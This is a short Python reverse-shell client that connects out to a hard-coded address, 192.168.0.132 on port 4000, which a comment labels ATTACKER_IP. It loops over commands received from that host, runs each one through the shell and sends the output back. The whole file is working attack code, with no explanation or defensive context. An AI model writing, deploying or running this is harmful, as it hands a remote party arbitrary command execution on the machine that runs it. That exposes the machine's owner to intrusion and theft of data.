import socket
import subprocess

#ATTACKER_IP = 192.168.0.132
################################################################
##PORT IS 4000

def main():
    s = socket.socket()
    s.connect(('192.168.0.132', 4000))
        
    cmd = s.recv(1024).decode()
            
    while cmd != 'exit':
        subprocess.call(cmd, shell=True)
        
        s.send(('\n' + subprocess.check_output(cmd).decode()).encode())
        s.send('Command executed successfully'.encode())
        
        cmd = s.recv(1024).decode()

    

if __name__ == "__main__":
    main()
